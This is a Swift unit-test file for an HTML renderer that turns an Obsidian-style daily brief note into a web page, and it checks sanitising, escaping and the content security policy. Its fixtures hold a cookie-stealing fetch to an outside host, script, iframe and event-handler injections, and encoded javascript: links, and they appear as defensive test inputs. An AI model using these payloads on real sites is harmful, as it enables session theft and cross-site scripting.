import Foundation
import XCTest
@testable import BaroqueCore

/// The Brief page's DOM, built as Obsidian's reading view builds it, from a made-up brief shaped like the morning
/// brief's note: front matter with `cssclasses`, the hero callout with its clock and picture, the lede and credit,
/// and section callouts with tasks, source lines, wiki links and nested bullets.
final class BriefHTMLTests: XCTestCase {
    static let note = #"""
    ---
    date: 2026-03-04
    generated: 2026-03-04 06:15 PT
    tags: [daily-brief]
    cssclasses: [daily-brief, wide-page]
    open: 3
    ---

    > [!brief-hero] *Good* **Morning!**
    > ```dataviewjs
    > const d = dv.el("span", "", {cls: "brief-date"});
    > const t = dv.el("span", "", {cls: "brief-time brief-clock"});
    > fetch("https://example.com/steal?c=" + document.cookie);
    > ```
    > ![A harbour at dawn](https://images.example.org/iiif/abc/full/!1800,1800/0/default.jpg)

    <p class="brief-lede">A slow morning, then the pottery class at 2 and the market after.</p>
    <p class="brief-credit">A Harbour at Dawn, An Imagined Painter, 1850. oil on canvas</p>

    > [!brief] Start with
    > **Water the seedlings.** The trays by the window dry out by noon.

    > [!brief] Needs attention
    > - [x] #todo Return the library books. <small>Library · Main St · [calendar](https://calendar.example.com/event?eid=abc&ctz=UTC) · [[Notes/Reading list|reading list]]</small> ✅ 2026-03-04
    > - [ ] #todo Send the garden club the planting plan. <small>Garden club · email · [open](https://mail.example.com/thread/123)</small>
    > - [ ] #todo Water the ferns #home 🔁 every week
    > - [ ] Sort the seed packets #errand

    > [!brief] Today
    > - **2:00 to 3:30 PM** Pottery class <small>[[Classes/Pottery|note]]</small>
    >     - bring the glaze samples
    > - **5:00 PM** Market

    > [!brief] Notes
    > - Fish & chips <3 "on Friday", said <Sam> &mdash; maybe
    > - <script>alert("x")</script>Kept text <a href="javascript:alert(1)" onclick="steal()">bad link</a> <img src="https://pics.example/p.png" onerror="steal()"> <iframe src="https://evil.example"></iframe>
    > - <style>body { display: none }</style>After the style <a href="&#106;avascript:alert(2)">encoded</a> <a href="jav&#x09;ascript:alert(3)">tabbed</a> <img src="javascript:alert(4)">

    <hr class="brief-rule">
    """#

    /// The 1-based line holding `text` in the note.
    private func line(_ text: String, in note: String = note) -> Int {
        let lines = note.split(omittingEmptySubsequences: false, whereSeparator: { $0.isNewline })
        return lines.firstIndex(where: { $0.contains(text) })! + 1
    }

    private func body(_ note: String = note, tasks: [Int: BriefHTML.TaskState] = [:]) -> String {
        BriefHTML.blocks(note, tasks: tasks).joined(separator: "\n")
    }

    /// The task states as the page gives them: each task enabled, as the file has it.
    private var fileStates: [Int: BriefHTML.TaskState] {
        var out: [Int: BriefHTML.TaskState] = [:]
        for case .task(let task) in Brief.parse(Self.note).blocks {
            out[task.lineNumber] = BriefHTML.TaskState(done: task.done, enabled: !task.repeats)
        }
        return out
    }

    private func page(_ note: String = note, css: [String] = ["/* the vault */"], appearance: BriefHTML.Appearance? = nil) -> String {
        BriefHTML.document(BriefHTML.Page(markdown: note, css: css, appearance: appearance, tasks: fileStates,
                                          footer: "WRITTEN TODAY 6:15  ·  FETCHED TODAY 7:02", nonce: "n0nce+/="))
    }

    // MARK: Callouts

    func testCalloutsAndTheirTitles() {
        let html = body()
        XCTAssertTrue(html.contains(#"data-callout="brief-hero" class="callout">"#))
        XCTAssertTrue(html.contains(#"<div class="callout-title-inner"><em>Good</em> <strong>Morning!</strong></div>"#))
        XCTAssertTrue(html.contains(#"<div class="callout-title" dir="auto"><div class="callout-icon"></div>"#))
        for title in ["Start with", "Needs attention", "Today", "Notes"] {
            XCTAssertTrue(html.contains(#"data-callout="brief" class="callout"><div class="callout-title" dir="auto"><div class="callout-icon"></div><div class="callout-title-inner">\#(title)</div>"#), title)
        }
        XCTAssertTrue(html.contains(#"<div class="callout-content"><p dir="auto"><strong>Water the seedlings.</strong> The trays by the window dry out by noon.</p></div>"#))
        // Every top-level block is one child of the sizer, as Obsidian wraps them.
        XCTAssertEqual(BriefHTML.blocks(Self.note, tasks: [:]).count, 7)
        XCTAssertTrue(BriefHTML.blocks(Self.note, tasks: [:]).allSatisfy { $0.hasPrefix(#"<div class="el-"#) && $0.hasSuffix("</div>") })
    }

    func testFoldedCalloutsAndPlainQuotes() {
        let html = body("> [!note]- Later\n> Hidden at first\n\n> [!tip|wide] \n> Shown\n\n> Just a quote\n> on two lines")
        XCTAssertTrue(html.contains(#"data-callout-fold="-" data-callout="note" class="callout is-collapsible is-collapsed">"#))
        XCTAssertTrue(html.contains(#"data-callout-metadata="wide" data-callout-fold="" data-callout="tip" class="callout">"#))
        XCTAssertTrue(html.contains(#"<div class="callout-title-inner">Tip</div>"#))
        XCTAssertTrue(html.contains("<blockquote dir=\"auto\"><p dir=\"auto\">Just a quote<br>\non two lines</p></blockquote>"))
    }

    // MARK: The hero

    func testTheHeroClockAndNoVaultScript() {
        let html = body()
        XCTAssertTrue(html.contains(#"<div class="block-language-dataviewjs"><span class="brief-date"></span><span class="brief-time brief-clock"></span></div>"#))
        XCTAssertTrue(html.contains(#"<img alt="A harbour at dawn" src="https://images.example.org/iiif/abc/full/!1800,1800/0/default.jpg">"#))
        for code in ["dv.el", "document.cookie", "steal", "fetch(", "<script", "alert"] {
            XCTAssertFalse(html.contains(code), code)
        }
        // The page runs only Baroque's script, which fills the spans as the vault's block does.
        let doc = page()
        XCTAssertEqual(doc.components(separatedBy: "<script").count - 1, 1)
        XCTAssertTrue(doc.contains(#"<script nonce="n0nce+/=">"#))
        XCTAssertTrue(doc.contains(#"toLocaleDateString("en-GB", { day: "2-digit", month: "short", year: "numeric" }).toUpperCase()"#))
        XCTAssertTrue(doc.contains(#"toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", second: "2-digit", hour12: true })"#))
        XCTAssertTrue(doc.contains(#"className: /\d/.test(c) ? "d" : "s""#))
        XCTAssertTrue(doc.contains("setInterval(tick, 1000)"))
    }

    func testOtherCodeBlocks() {
        let html = body("```swift\nlet a = \"<b>\" && b\n```\n\n```dataviewjs\ndv.list([1])\n```\n\n```dataview\nLIST\n```\n\n```tasks\nnot done\n```")
        XCTAssertTrue(html.contains("<pre><code class=\"language-swift\">let a = &quot;&lt;b&gt;&quot; &amp;&amp; b</code></pre>"))
        XCTAssertFalse(html.contains("dv.list"))
        XCTAssertFalse(html.contains("LIST"))
        XCTAssertFalse(html.contains("not done"))
    }

    func testTheLedeAndCreditPassThrough() {
        let html = body()
        XCTAssertTrue(html.contains(#"<div class="el-p"><p class="brief-lede">A slow morning, then the pottery class at 2 and the market after.</p>"#))
        XCTAssertTrue(html.contains(#"<p class="brief-credit">A Harbour at Dawn, An Imagined Painter, 1850. oil on canvas</p></div>"#))
        XCTAssertTrue(html.contains(#"<div class="el-hr"><hr class="brief-rule"></div>"#))
    }

    // MARK: Tasks

    func testTasksCarryTheirLinesAndState() {
        let html = body(tasks: fileStates)
        let done = line("Return the library books")
        let open = line("Send the garden club")
        XCTAssertTrue(html.contains(#"<ul class="contains-task-list"><li data-line="\#(done)" data-task="x" class="task-list-item is-checked" dir="auto"><input data-line="\#(done)" type="checkbox" class="task-list-item-checkbox" checked>Return the library books."#))
        XCTAssertTrue(html.contains(#"<li data-line="\#(open)" data-task=" " class="task-list-item" dir="auto"><input data-line="\#(open)" type="checkbox" class="task-list-item-checkbox">Send the garden club the planting plan."#))
        // The ✅ date is the line's own text.
        XCTAssertTrue(html.contains("</small> ✅ 2026-03-04</li>"))
    }

    func testEveryTaskBriefFindsHasItsCheckbox() {
        let html = body(tasks: fileStates)
        let tasks = Brief.parse(Self.note).blocks.compactMap { block -> Brief.TaskLine? in
            if case .task(let t) = block { return t } else { return nil }
        }
        XCTAssertEqual(tasks.count, 4)
        for task in tasks {
            XCTAssertTrue(html.contains(#"<input data-line="\#(task.lineNumber)" type="checkbox""#), task.text)
        }
        XCTAssertEqual(html.components(separatedBy: "type=\"checkbox\"").count - 1, 4)
    }

    func testTodoIsHiddenAndOtherTagsAreLinks() {
        let html = body(tasks: fileStates)
        XCTAssertFalse(html.contains("#todo"))
        XCTAssertFalse(html.contains("todo"))
        XCTAssertTrue(html.contains(##"Sort the seed packets <a href="#errand" class="tag">#errand</a>"##))
        XCTAssertTrue(html.contains(##"Water the ferns <a href="#home" class="tag">#home</a> 🔁 every week"##))
        // Outside a task, #todo is an ordinary tag.
        XCTAssertTrue(body("A plain line #todo").contains(##"<a href="#todo" class="tag">#todo</a>"##))
    }

    func testTheStateThePageGives() {
        let done = line("Return the library books")
        let open = line("Send the garden club")
        let repeats = line("Water the ferns")
        let errand = line("Sort the seed packets")
        let html = body(tasks: [
            done: .init(done: false, note: "Saving…"),
            open: .init(done: true),    // a remembered tick: ticked though the file says [ ]
            repeats: .init(done: false, enabled: false, note: "Repeats: tick it in Obsidian"),
            errand: .init(done: true, note: "Your token can only read.", problem: true),
        ])
        XCTAssertTrue(html.contains(#"<li data-line="\#(done)" data-task=" " class="task-list-item" dir="auto"><input data-line="\#(done)" type="checkbox" class="task-list-item-checkbox">"#))
        XCTAssertTrue(html.contains(#"✅ 2026-03-04<span class="baroque-task-note">Saving…</span></li>"#))
        XCTAssertTrue(html.contains(#"<li data-line="\#(open)" data-task="x" class="task-list-item is-checked" dir="auto"><input data-line="\#(open)" type="checkbox" class="task-list-item-checkbox" checked>"#))
        XCTAssertTrue(html.contains(#"<input data-line="\#(repeats)" type="checkbox" class="task-list-item-checkbox" disabled>"#))
        XCTAssertTrue(html.contains(#"<span class="baroque-task-note">Repeats: tick it in Obsidian</span>"#))
        XCTAssertTrue(html.contains(#"<span class="baroque-task-note is-problem">Your token can only read.</span>"#))
    }

    func testATaskThePageDoesntKnowCantBeTapped() {
        let html = body("- [-] Cancelled one\n- [ ] Open one", tasks: [:])
        XCTAssertTrue(html.contains(#"<li data-line="1" data-task="-" class="task-list-item is-checked" dir="auto"><input data-line="1" type="checkbox" class="task-list-item-checkbox" checked disabled>Cancelled one</li>"#))
        XCTAssertTrue(html.contains(#"<input data-line="2" type="checkbox" class="task-list-item-checkbox" disabled>Open one"#))
    }

    // MARK: Lists, links and source lines

    func testNestedListsAndSourceLines() {
        let html = body()
        let item = line("Pottery class")
        let sub = line("bring the glaze samples")
        XCTAssertTrue(html.contains(#"<ul><li data-line="\#(item)" dir="auto"><strong>2:00 to 3:30 PM</strong> Pottery class <small><a data-href="Classes/Pottery" href="Classes/Pottery" class="internal-link">note</a></small><ul><li data-line="\#(sub)" dir="auto">bring the glaze samples</li></ul></li>"#))
        XCTAssertTrue(html.contains(#"<li data-line="\#(line("**5:00 PM** Market"))" dir="auto"><strong>5:00 PM</strong> Market</li></ul>"#))
        XCTAssertTrue(html.contains(#"<small>Library · Main St · <a class="external-link" href="https://calendar.example.com/event?eid=abc&amp;ctz=UTC" rel="noopener nofollow">calendar</a> · <a data-href="Notes/Reading list" href="Notes/Reading list" class="internal-link">reading list</a></small>"#))
    }

    func testNestingByTabsAndOrderedLists() {
        let html = body("1. One\n\t- under one\n\t\t- deeper\n2. Two\n\n3) Three")
        XCTAssertTrue(html.contains(#"<ol><li data-line="1" dir="auto">One<ul><li data-line="2" dir="auto">under one<ul><li data-line="3" dir="auto">deeper</li></ul></li></ul></li><li data-line="4" dir="auto">Two</li><li data-line="6" dir="auto">Three</li></ol>"#))
    }

    func testInlineMarkdown() {
        let html = body("Some **bold**, *italic*, _also italic_, snake_case_name, `a <code> span`, ~~gone~~ and ==marked==.\nNext line [[Folder/Deep/Note]] [[Note#Part]] and https://example.com/a_b.")
        XCTAssertTrue(html.contains("Some <strong>bold</strong>, <em>italic</em>, <em>also italic</em>, snake_case_name, <code>a &lt;code&gt; span</code>, <del>gone</del> and <mark>marked</mark>.<br>\nNext line"))
        XCTAssertTrue(html.contains(#"<a data-href="Folder/Deep/Note" href="Folder/Deep/Note" class="internal-link">Note</a>"#))
        XCTAssertTrue(html.contains(#"<a data-href="Note#Part" href="Note#Part" class="internal-link">Note &gt; Part</a>"#))
        XCTAssertTrue(html.contains(#"<a class="external-link" href="https://example.com/a_b" rel="noopener nofollow">https://example.com/a_b</a>.</p>"#))
    }

    func testHeadingsTablesAndBreaks() {
        let html = body("# Title *here*\n\n## Part\n\n| A | B |\n|:--|--:|\n| 1 | **2** |\n\n---\n\n#notheading")
        XCTAssertTrue(html.contains(#"<h1 data-heading="Title *here*" dir="auto">Title <em>here</em></h1>"#))
        XCTAssertTrue(html.contains(#"<h2 data-heading="Part" dir="auto">Part</h2>"#))
        XCTAssertTrue(html.contains(#"<table><thead><tr><th style="text-align: left" dir="auto">A</th><th style="text-align: right" dir="auto">B</th></tr></thead><tbody><tr><td style="text-align: left" dir="auto">1</td><td style="text-align: right" dir="auto"><strong>2</strong></td></tr></tbody></table>"#))
        XCTAssertTrue(html.contains(#"<div class="el-hr"><hr></div>"#))
        XCTAssertTrue(html.contains(##"<p dir="auto"><a href="#notheading" class="tag">#notheading</a></p>"##))
    }

    func testCommentsAndFrontMatterAreHidden() {
        let html = body("---\ncssclasses: x\nsecret: front\n---\nSeen %%not seen%% here\n%%\n- [ ] hidden task\n%%\nAfter")
        XCTAssertFalse(html.contains("front"))
        XCTAssertFalse(html.contains("not seen"))
        XCTAssertFalse(html.contains("hidden task"))
        XCTAssertTrue(html.contains("Seen  here<br>\nAfter"))
    }

    // MARK: Safety

    func testSanitising() {
        let html = body()
        for bad in ["<script", "alert", "onclick", "onerror", "steal", "<iframe", "evil.example", "<style", "display: none", "javascript", "&#106;"] {
            XCTAssertFalse(html.contains(bad), bad)
        }
        XCTAssertTrue(html.contains(#"Kept text <a>bad link</a> <img src="https://pics.example/p.png"> </li>"#))
        XCTAssertTrue(html.contains("After the style <a>encoded</a> <a>tabbed</a> </li>"))
    }

    func testRawHTMLIsBalancedAndFiltered() {
        let html = body(#"<div class="box" style="color: red" data-x="1" onmouseover="x()"><span>open"#
                        + "\n\nText <b>bold <i>both</b> after</i> <unknown> <form><input value=\"x\"></form> <a href=\"notes/My%20Note.md\">mine</a>")
        XCTAssertTrue(html.contains(#"<div class="el-div"><div class="box" style="color: red" data-x="1"><span>open</span></div></div>"#))
        XCTAssertTrue(html.contains(#"Text <b>bold <i>both</i></b> after &lt;unknown&gt;  <a class="internal-link" data-href="notes/My Note.md" href="notes/My Note.md">mine</a></p>"#))
        // A <script> block runs to its closing tag, blank lines and all.
        let script = body("<script>\nalert(1)\n\nalert(2)\n</script>\nAfter")
        XCTAssertFalse(script.contains("alert"))
        XCTAssertEqual(script, #"<div class="el-p"><p dir="auto">After</p></div>"#)
    }

    func testEscaping() {
        let html = body()
        XCTAssertTrue(html.contains("Fish &amp; chips &lt;3 &quot;on Friday&quot;, said &lt;Sam&gt; &mdash; maybe</li>"))
        XCTAssertTrue(body(#"\*not italic\* and \<b\>"#).contains("*not italic* and &lt;b&gt;"))
        let titled = body("> [!brief] Fish & <chips>\n> x")
        XCTAssertTrue(titled.contains(#"<div class="callout-title-inner">Fish &amp; &lt;chips&gt;</div>"#))
        XCTAssertTrue(body("> [!a\"b] T\n> x").contains(#"data-callout="a&quot;b""#))
        XCTAssertFalse(body(#"[x](https://example.com/?q="><script>alert(1)</script>)"#).contains("<script"))
    }

    func testLinkTargets() {
        XCTAssertEqual(BriefHTML.linkTarget("https://example.com"), .external("https://example.com"))
        XCTAssertEqual(BriefHTML.linkTarget("mailto:a@example.com"), .external("mailto:a@example.com"))
        XCTAssertEqual(BriefHTML.linkTarget("obsidian://open?vault=V"), .external("obsidian://open?vault=V"))
        XCTAssertEqual(BriefHTML.linkTarget("Folder/My%20Note.md"), .internal("Folder/My Note.md"))
        for bad in ["javascript:alert(1)", " JaVaScRiPt:alert(1)", "java\tscript:x", "vbscript:x", "data:text/html,x", "file:///etc", "//evil.example", "#top"] {
            XCTAssertNil(BriefHTML.linkTarget(bad), bad)
        }
        XCTAssertEqual(BriefHTML.imageSource("https://a.example/p.jpg"), "https://a.example/p.jpg")
        XCTAssertNil(BriefHTML.imageSource("http://a.example/p.jpg"))
        XCTAssertNil(BriefHTML.imageSource("data:text/html;base64,PHNjcmlwdD4="))
        XCTAssertEqual(BriefHTML.decodeEntities("&#106;ava&#x73;cript&colon;x&#58"), "javascript:x:")
    }

    // MARK: The page

    func testCSPAndNonce() {
        let doc = page()
        XCTAssertTrue(doc.contains(#"<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src https: data:; style-src 'unsafe-inline'; font-src data:; script-src 'nonce-n0nce+/='">"#))
        XCTAssertTrue(doc.contains(#"<div class="markdown-preview-view markdown-rendered is-readable-line-width daily-brief wide-page"><div class="markdown-preview-sizer markdown-preview-section">"#))
        XCTAssertTrue(doc.contains(#"<div class="el-div baroque-stamp">WRITTEN TODAY 6:15  ·  FETCHED TODAY 7:02</div>"#))
        XCTAssertNotEqual(BriefHTML.makeNonce(), BriefHTML.makeNonce())
        // A nonce can't carry anything into the policy.
        XCTAssertTrue(BriefHTML.csp(nonce: "a' ; script-src *").hasSuffix("'nonce-ascriptsrc'"))
    }

    func testTheVaultCSSComesLastAndCantCloseItsStyle() {
        let doc = page(css: ["/* first */", "a { color: red } </style><script>alert(1)</script>"])
        let base = doc.range(of: "--baroque-tick")!.lowerBound
        let first = doc.range(of: "/* first */")!.lowerBound
        XCTAssertLessThan(base, first)
        XCTAssertTrue(doc.contains(#"a { color: red } <\/style><script>alert(1)</script>"#))
        XCTAssertEqual(doc.components(separatedBy: "</style>").count - 1, 4)   // base, fonts and the two snippets
        XCTAssertFalse(doc.contains("Georgia, serif; font-style: italic; margin-right"))
    }

    func testTheFallbackWhenThereIsNoCSS() {
        let doc = page(css: [])
        XCTAssertTrue(doc.contains(BriefHTML.fallbackCSS))
        XCTAssertTrue(doc.contains(BriefHTML.baseCSS))
    }

    func testFontsFromAppearance() throws {
        let json = Data(##"{"accentColor": "#fa8072", "textFontFamily": "Times New Roman", "interfaceFontFamily": "Inter, 'Avenir Next'", "monospaceFontFamily": "x;}</style>", "baseFontSize": 18}"##.utf8)
        let appearance = try XCTUnwrap(BriefHTML.Appearance(json: json))
        XCTAssertEqual(appearance.textFontFamily, "Times New Roman")
        let css = BriefHTML.fontVariables(appearance)
        XCTAssertTrue(css.contains(#"--font-text: "Times New Roman", var(--font-default);"#))
        XCTAssertTrue(css.contains(#"--font-interface: "Inter", "Avenir Next", var(--font-default);"#))
        XCTAssertTrue(css.contains("--font-text-size: 18px;"))
        XCTAssertFalse(css.contains("--font-monospace"))
        XCTAssertFalse(css.contains("</style>"))
        XCTAssertNil(BriefHTML.Appearance(json: Data("[1]".utf8)))
        XCTAssertEqual(BriefHTML.fontVariables(nil), ":root {\n\n}")
    }

    func testCSSClasses() {
        XCTAssertEqual(BriefHTML.cssClasses(in: Self.note), ["daily-brief", "wide-page"])
        XCTAssertEqual(BriefHTML.cssClasses(in: "---\ncssclasses:\n  - one\n  - \"two\"\ntitle: x\n---\n"), ["one", "two"])
        XCTAssertEqual(BriefHTML.cssClasses(in: "---\ncssclass: solo, solo\n---\n"), ["solo"])
        XCTAssertEqual(BriefHTML.cssClasses(in: "---\ncssclasses: [ok, ../up, \"a b\", x\"><script]\n---\n"), ["ok", "a", "b"])
        XCTAssertEqual(BriefHTML.cssClasses(in: "cssclasses: [no-front-matter]"), [])
    }

    func testCRLFAndByteOrderMarkKeepLineNumbers() {
        let md = "\u{FEFF}---\r\ncssclasses: [x]\r\n---\r\n> [!brief] Tasks\r\n> - [ ] One\r\n"
        XCTAssertTrue(body(md).contains(#"<li data-line="5" data-task=" ""#))
        XCTAssertEqual(Brief.parse(md).blocks.compactMap { if case .task(let t) = $0 { return t.lineNumber } else { return nil } }, [5])
    }
}
